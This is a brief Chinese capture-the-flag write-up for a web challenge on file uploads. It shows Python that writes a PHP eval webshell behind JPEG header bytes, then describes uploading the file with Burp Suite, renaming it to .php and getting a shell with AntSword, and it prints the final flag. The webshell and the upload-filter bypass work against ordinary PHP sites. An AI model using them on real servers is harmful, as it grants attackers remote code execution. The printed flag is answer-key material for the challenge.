# Web-13｜第十三章 通幽关·灵纹诡影

## 碎碎念

图片马+蚁剑，有点注入的意思
***
## Writeup

题目只是对文件的格式做了非常多的限制，建议扩展名以及十六进制校验码都可以直接在前面直接添加头解决，然后我们做一个 php 一句话木马：

```python
with open('one_word.jpg', 'wb') as f:
    data = b"\xFF\xD8\xFF"
    data += b"\n"
    data += b"<?php @eval($_POST['a']);?>"
    f.write(data)
```

使用 burpsuite 上传文件，将文件后缀名改成 php 使木马生效：

![](../../../../assets/Pasted%20image%2020251029141610.png)


使用蚁剑即可使用密钥 getshell，在 env 中得到 flag：

![](../../../../assets/Pasted%20image%2020251029142155.png)

最终 flag：`moectf{6f7c9ff9-1142-fa44-e422-58aa5e703487}`